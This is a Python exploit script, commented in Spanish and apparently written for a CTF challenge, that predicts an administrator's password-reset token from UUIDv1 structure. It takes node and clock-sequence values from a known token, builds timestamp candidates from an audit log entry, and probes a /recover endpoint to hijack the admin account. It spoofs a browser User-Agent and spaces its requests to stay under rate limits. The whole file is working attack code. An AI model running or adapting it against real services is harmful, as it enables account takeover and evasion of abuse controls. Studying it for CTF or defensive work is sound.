#!/usr/bin/env python3
# Time Served (Fluid Attacks CTF 2026) -- reset token predecible por UUIDv1.
# Uso:    ./uuidv1_reset_predict.py <base_url> <mi_token_uuidv1_conocido> <audit_ts_iso_del_admin>
# Ejemplo: ./uuidv1_reset_predict.py https://d63c1b5af3e78f8d.chal.ctf.ae \
#            aabbccdd-1122-11ef-8000-49f9d6894147 2026-09-26T15:04:07.123456Z
#
# UUIDv1 = timestamp(100ns desde 1582) + clockseq + node(MAC). Con un token propio se fijan
# node y clockseq (constantes del proceso); con el timestamp del evento de reset del admin
# (endpoint /audit, microsegundos) se reconstruyen candidatos y se sondea /recover/<token>.
# Los UUID reales caen en ms exactos -> pocos candidatos. OJO: sondear ESPACIADO (rate-limit de la plataforma).

import sys, uuid, time, datetime, urllib.request, urllib.error

BASE   = sys.argv[1].rstrip("/")
MYTOK  = sys.argv[2]                      # un UUIDv1 propio (de /mailbox/<mi-email>)
AUDIT  = sys.argv[3]                      # timestamp ISO de reset.requested del admin (de /audit)
GAP    = 0.4                              # segundos entre sondas -> ritmo humano

u = uuid.UUID(MYTOK)
node, clockseq = u.node, u.clock_seq      # fijos por proceso (ej. node=0x49f9d6894147, clockseq=0x1c3c)
print(f"[*] node={node:012x} clockseq=0x{clockseq:04x}")

# timestamp base del audit -> intervalos de 100ns UUID (offset Gregoriano 1582-10-15)
dt = datetime.datetime.fromisoformat(AUDIT.replace("Z", "+00:00"))
epoch = dt.timestamp()
GREG = 0x01b21dd213814000                 # 100ns entre 1582-10-15 y 1970-01-01
base_100ns = int(epoch * 1e7) + GREG

def probe(tok: str) -> int:
    req = urllib.request.Request(f"{BASE}/recover/{tok}",
        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0 Safari/537.36"})
    try:
        return urllib.request.urlopen(req, timeout=10).status
    except urllib.error.HTTPError as e:
        return e.code

# barrido acotado: +-2 ms, solo timestamps en ms exactos (multiplos de 10_000 * 100ns)
STEP = 10_000                             # 1 ms en unidades de 100ns
for ms in range(-2, 3):
    t = ((base_100ns + ms * STEP) // STEP) * STEP
    time_low  =  t        & 0xffffffff
    time_mid  = (t >> 32) & 0xffff
    time_hi   = ((t >> 48) & 0x0fff) | 0x1000        # version 1
    cs        = (clockseq & 0x3fff) | 0x8000          # variante RFC 4122
    cand = uuid.UUID(fields=(time_low, time_mid, time_hi, cs >> 8, cs & 0xff, node))
    code = probe(str(cand))
    print(f"   ms{ms:+d} {cand} -> {code}")
    if code == 200:
        print(f"[+] TOKEN VALIDO: {cand}  -> POST /recover/{cand} para resetear al admin")
        break
    time.sleep(GAP)
